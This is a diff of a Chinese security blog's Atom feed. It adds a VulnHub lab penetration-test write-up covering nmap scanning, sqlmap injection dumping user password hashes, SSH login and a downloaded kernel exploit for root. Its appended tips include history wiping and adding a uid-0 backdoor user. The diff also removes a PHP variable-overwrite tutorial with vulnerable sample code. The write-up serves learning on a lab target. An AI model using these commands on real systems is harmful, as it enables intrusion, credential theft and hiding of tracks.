@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2017-04-29T05:17:16.304Z</updated>
+  <updated>2017-05-18T08:49:06.858Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -14,6 +14,65 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>一次基于Linux的渗透测试</title>
+    <link href="http://yoursite.com/%E6%B8%97%E9%80%8F/2017/05/18/%E4%B8%80%E6%AC%A1%E5%9F%BA%E4%BA%8ELinux%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html"/>
+    <id>http://yoursite.com/渗透/2017/05/18/一次基于Linux的渗透测试.html</id>
+    <published>2017-05-18T07:52:39.000Z</published>
+    <updated>2017-05-18T08:49:06.858Z</updated>
+    
+    <content type="html"><![CDATA[<p>　　最近发现了一个不错的<a href="https://www.vulnhub.com" target="_blank" rel="external">靶场</a>，里面各种渗透测试的虚拟机，大家可以下载进行尝试学习。还有就是一个<a href="https://www.exploit-db.com" target="_blank" rel="external">漏洞利用存档</a>，可以找到很多我们可以利用的学习的东西。 </p>
+<h3 id="0x01-信息搜集"><a href="#0x01-信息搜集" class="headerlink" title="0x01 信息搜集"></a>0x01 信息搜集</h3><ul>
+<li>首先就是确定我们靶机的目标IP<br><code>nmap -sP -T5 192.168.0.1/24</code><a id="more"></a><br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/69675734-file_1495024767524_12b41.png" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/92578056-file_1495024794093_f650.png" alt=""><br>通过前面的步骤，我们对目标进行具体的端口扫描以及操作系统识别，发现开启有80，22以及6667端口。<br><code>nmap -sV -p- -A -O -T4 192.168.0.170</code><br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/29748247-file_1495025167563_18075.png" alt=""> </li>
+<li>目录扫描<br>继续对目标进行敏感目录扫描，御剑等工具都可以。这里我使用KALI的<code>nikto</code>以及<code>dirb</code>命令进行简单的目录扫描。<br><code>nikto -host http://192.168.0.170</code>或者<code>dirb http://192.168.0.170</code></li>
+</ul>
+<p><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/1901036-file_1495026985555_c687.jpg" alt=""></p>
+<p><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/34894438-file_1495026990934_c5e1.jpg" alt=""></p>
+<h3 id="0x02-漏洞发现"><a href="#0x02-漏洞发现" class="headerlink" title="0x02 漏洞发现"></a>0x02 漏洞发现</h3><p>　　访问IP之后的页面，发现并没有什么特别的地方，于是只能查看源代码，点击超链接进行查看。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/72915652-file_1495025513089_4b42.png" alt=""></p>
+<p>在链接的地方竟然发现了秘密的地方，于是访问之<br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/16907544-file_1495027180453_a40c.png" alt=""><br>此处是一个登录界面，我们可以尝试注册一个用户进行登录，但只是一个游客的形式。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/77969300-file_1495027584527_6db5.png" alt=""><br>我们注册一个用户进行登录，还有有很多功能的，于是可以进行更多的尝试。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/87595415-file_1495028411853_56b6.png" alt=""></p>
+<p>　　在下面发现OpenDocMan v1.2.7， OpenDocMan是一个功能完整的基于Web的文档管理系统(DMS)，于是找找OpenDocMan v1.2.7所公布的一些可以利用的<a href="https://www.exploit-db.com/exploits/32075/" target="_blank" rel="external">漏洞</a>。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/52436738-file_1495029065698_1762a.png" alt=""><br>发现可以利用的好几个漏洞，于是先行尝试sql注入。</p>
+<h3 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h3><p>　　经过简单的测试发现<code>http://192.168.0.170/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user</code>处确实注入。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/72043277-file_1495029395412_5b3f.png" alt=""></p>
+<p><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/40331315-file_1495029419098_1162.png" alt=""><br>于是直接拿出神器Sqlmap进行注入。<br><code>sqlmap.py -u &quot;http://192.168.0.170/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user&quot; -p add_value --dbs</code><br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/50127468-file_1495029835183_507e.png" alt=""><br>经过常见的那几个命令我们可以成功的拿到登录名和密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sqlmap.py -u &quot;http://192.168.0.170/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user&quot; -p add_value -D jabcd0cs --tables</div><div class="line">sqlmap.py -u &quot;http://192.168.0.170/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user&quot; -p add_value -D jabcd0cs -T odm_admin --columns</div></pre></td></tr></table></figure></p>
+<p>发现admin表里面没有信息，只能从user表里面提取信息。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sqlmap.py -u &quot;http://192.168.0.170/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user&quot; -p add_value -D jabcd0cs -T odm_user --columns`</div><div class="line">sqlmap.py -u &quot;http://192.168.0.170/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user&quot; -p add_value -D jabcd0cs -T odm_user -C &quot;username,password&quot; --dump</div></pre></td></tr></table></figure></p>
+<p>我们可以看到已经获取到了数据库的用户名和密码，直接MD5解密就可以ssh登录服务器。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-18/42366405-file_1495083173994_9c37.png" alt=""><br>用户名<code>webmin</code>，密码<code>b78aae356709f8c31118ea613980954b</code>，明文为<code>webmin</code></p>
+<h3 id="0x04-权限提升"><a href="#0x04-权限提升" class="headerlink" title="0x04 权限提升"></a>0x04 权限提升</h3><p>经过前面端口扫描可以发现，22端口发放着，可以进行ssh连接。<code>ssh webmin@192.168.0.170</code><br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-18/75985467-file_1495083672930_ba2a.jpg" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-18/61650463-file_1495083646059_acf0.png" alt=""><br>　　<br>　　查看权限发现是普通用户的权限，所以得继续进行提权操作。获取到低权限SHELL后我们通常做下面几件事：</p>
+<ul>
+<li>检测操作系统的发行版本</li>
+<li>查看内核版本</li>
+<li>检测当前用户权限</li>
+<li>列举Suid文件</li>
+<li>查看已经安装的包，程序，运行的服务，过期版本的有可能有漏洞</li>
+</ul>
+<p><code>lsb_release -a</code>查看系统的发行版本<br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-18/73239541-file_1495083911393_12b4.png" alt=""><br><code>uname -a</code>查看内核版本<br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-18/40320294-file_1495083992867_f6e7.png" alt=""></p>
+<p>　　我们可以看到此操作系统采用的是Ubuntu 14.04.4 LTS，内核版本是3.13.0-24-generic，首先想到的就是去漏洞库寻找有没有可以用的exploit。</p>
+<p>下载漏洞exploit<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">wget https://www.exploit-db.com/download/37292</div><div class="line">mv 37292 shell.c</div><div class="line">gcc -o shell shell.c</div><div class="line">./shell</div></pre></td></tr></table></figure></p>
+<p><img src="http://obh1qcqek.bkt.clouddn.com/17-5-18/23001066-file_1495084882743_12f82.png" alt=""></p>
+<p><strong>附Linux渗透小技巧：</strong></p>
+<ul>
+<li>bash去掉history记录<br>export HISTSIZE=0<br>export HISTFILE=/dev/null</li>
+<li>Linux添加uid为0的用户<br>useradd -o -u 0 cnbird</li>
+<li>可以翻下 mysql_history .bash_history</li>
+<li>ls -al 看下root目录下都有什么隐藏目录 例如 .ssh .vnc 等</li>
+<li>可以看下 .ssh/下面的ssh连接记录等，也可以看下全局变量文件什么的</li>
+<li>通过webshell反弹shell回来之后获取真正的ttyshell<br><code>python -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</code></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;　　最近发现了一个不错的&lt;a href=&quot;https://www.vulnhub.com&quot;&gt;靶场&lt;/a&gt;，里面各种渗透测试的虚拟机，大家可以下载进行尝试学习。还有就是一个&lt;a href=&quot;https://www.exploit-db.com&quot;&gt;漏洞利用存档&lt;/a&gt;，可以找到很多我们可以利用的学习的东西。 &lt;/p&gt;
+&lt;h3 id=&quot;0x01-信息搜集&quot;&gt;&lt;a href=&quot;#0x01-信息搜集&quot; class=&quot;headerlink&quot; title=&quot;0x01 信息搜集&quot;&gt;&lt;/a&gt;0x01 信息搜集&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;首先就是确定我们靶机的目标IP&lt;br&gt;&lt;code&gt;nmap -sP -T5 192.168.0.1/24&lt;/code&gt;
+    
+    </summary>
+    
+      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
+    
+    
+      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
   
   <entry>
     <title>CTF常见题型</title>
@@ -148,9 +207,9 @@
       <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
     
     
-      <category term="密码学" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
-    
       <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+      <category term="密码学" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
     
   </entry>
   
@@ -972,9 +1031,9 @@ print c
       <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
     
     
-      <category term="密码学" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
-    
       <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+      <category term="密码学" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
     
   </entry>
   
@@ -2049,79 +2108,6 @@ meterpreter &gt; migrate + 进程号
       <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
     
       <category term="Metasploit" scheme="http://yoursite.com/tags/Metasploit/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>变量覆盖</title>
-    <link href="http://yoursite.com/%E6%BC%8F%E6%B4%9E/2016/11/30/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96.html"/>
-    <id>http://yoursite.com/漏洞/2016/11/30/变量覆盖.html</id>
-    <published>2016-11-30T13:08:24.000Z</published>
-    <updated>2017-04-02T07:41:06.044Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="0x01-变量覆盖"><a href="#0x01-变量覆盖" class="headerlink" title="0x01 变量覆盖"></a>0x01 变量覆盖</h3><p>变量覆盖是指可以用我们自定义的参数值替换程序原有的变量值。变量覆盖漏洞通常需要结合程序的其他功能来实现完整的攻击。<br>变量覆盖漏洞大多由于函数使用不当造成的，经常引发变量覆盖漏洞的函数有extract()函数，parse_str()、import_request_variables()函数在没有开启全局变量注册的时候，调用了这个函数相当于开启了全局变量注册。<br><a id="more"></a></p>
-<h3 id="0x02-变量覆盖函数"><a href="#0x02-变量覆盖函数" class="headerlink" title="0x02 变量覆盖函数"></a>0x02 变量覆盖函数</h3><p>2.1、全局变量覆盖</p>
-<blockquote>
-<p>$GLOBALS, 所有全局变量数组<br>$_SERVER， 服务器环境变量数组<br>$_GET，通过GET方法传递给脚本的变量数组<br>$_POST， 通过POST方法传递给脚本的变量数组<br>$_COOKIE，cookie变量数组<br>$_REQUEST，所有用户输入的变量数组，包括$_GET, $_POST和$_COOKIE所包含的输入内容<br>$_FILES，与文件上传相关得变量数组<br>$_ENV，环境变量数组<br>$_SESSION，会话变量数组</p>
-</blockquote>
-<p>2.1、遍历初始化变量</p>
-<pre><code>&lt;?php
-    $a=&apos;hello&apos;;
-    foreach($_GET as $key =&gt; $value{
-        $$key = $value;
-    }
- print $a;
- ?&gt;
-</code></pre><p><img src="http://p1.bqimg.com/567571/283704e0491964bc.png" alt=""><br><strong><em>在代码审计时需要注意类似“$$k”的变量赋值方式有可能覆盖已有的变量，从而导致一些不可控制的结果。</em></strong> </p>
-<p>2.2、parse_str()变量覆盖</p>
-<pre><code>&lt;?php
-$var=&apos;Hello&apos;;
-parse_str($_SERVER[&apos;QUERY_STRING&apos;]);
-print $var;
-?&gt;
-</code></pre><p><img src="http://p1.bqimg.com/567571/b04a08dda72e3da2.png" alt=""><br><strong><em>与parse_str()类似的函数还有mb_parse_str()，parse_str — 将字符串解析成多个变量，如果参数str是URL传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域。</em></strong> </p>
-<p>2.3、import_request_variables()变量覆盖</p>
-<pre><code>&lt;?php  
-$a = &apos;0&apos;;  
-import_request_variables(&apos;G&apos;);  
-
-if($a == 1){  
-  echo &quot;true!&quot;;  
-}else{  
-  echo &quot;false!&quot;;  
-}  
-?&gt; 
-</code></pre><p><img src="http://i1.piimg.com/567571/91c711dfdcea3bb8.png" alt=""><br><strong><em>import_request_variables()，将 GET／POST／Cookie 变量导入到全局作用域中。如果你禁止了 register_globals，但又想用到一些全局变量，那么此函数就很有用。</em></strong></p>
-<p>2.4、extract()变量覆盖</p>
-<pre><code>&lt;?php  
-
-$a = &apos;0&apos;;  
-extract($_GET)；  
-
-if($a==1){  
-echo &quot;true!&quot;;  
-}else{  
-echo &quot;false!&quot;;  
-}  
-?&gt; 
-</code></pre><p>假设构造以下链接：<a href="http://www.a.com/1.php?a=1时，界面上会打印出true！" target="_blank" rel="external">http://www.a.com/1.php?a=1时，界面上会打印出true！</a><br>安全的做法是确定register_globals=OFF后，在调用extract()时使用EXTR_SKIP保证已有变量不会被覆盖。<br><strong><em>PHP extract() 函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素，键名用于变量名，键值用于变量值。</em></strong></p>
-<h3 id="0x03-挖掘经验"><a href="#0x03-挖掘经验" class="headerlink" title="0x03 挖掘经验"></a>0x03 挖掘经验</h3><p>只要搜索敏感函数，然后回溯函数是否可控，当然也可以通过搜索”$$”关键字去挖掘。</p>
-<h3 id="0x04-漏洞防范"><a href="#0x04-漏洞防范" class="headerlink" title="0x04 漏洞防范"></a>0x04 漏洞防范</h3><p>1、<strong>使用原始变量</strong><br>最直接方法就是不进行变量注册，直接使用原生的$_GET、$_POST等数组变量进行操作；<br>2、<strong>验证变量存在</strong><br>注册变量前判断变量是否存在。最重要的一点，自行申明的变量一定要初始化，不然即使注册变量代码在执行流程最前面也能覆盖掉这些未初始化的变量。</p>
-<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="0" height="0" src="http://music.163.com/outchain/player?type=2&id=63650&auto=1&height=66"></iframe>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;0x01-变量覆盖&quot;&gt;&lt;a href=&quot;#0x01-变量覆盖&quot; class=&quot;headerlink&quot; title=&quot;0x01 变量覆盖&quot;&gt;&lt;/a&gt;0x01 变量覆盖&lt;/h3&gt;&lt;p&gt;变量覆盖是指可以用我们自定义的参数值替换程序原有的变量值。变量覆盖漏洞通常需要结合程序的其他功能来实现完整的攻击。&lt;br&gt;变量覆盖漏洞大多由于函数使用不当造成的，经常引发变量覆盖漏洞的函数有extract()函数，parse_str()、import_request_variables()函数在没有开启全局变量注册的时候，调用了这个函数相当于开启了全局变量注册。&lt;br&gt;
-    
-    </summary>
-    
-      <category term="漏洞" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E/"/>
-    
-    
-      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-      <category term="php" scheme="http://yoursite.com/tags/php/"/>
     
   </entry>
   
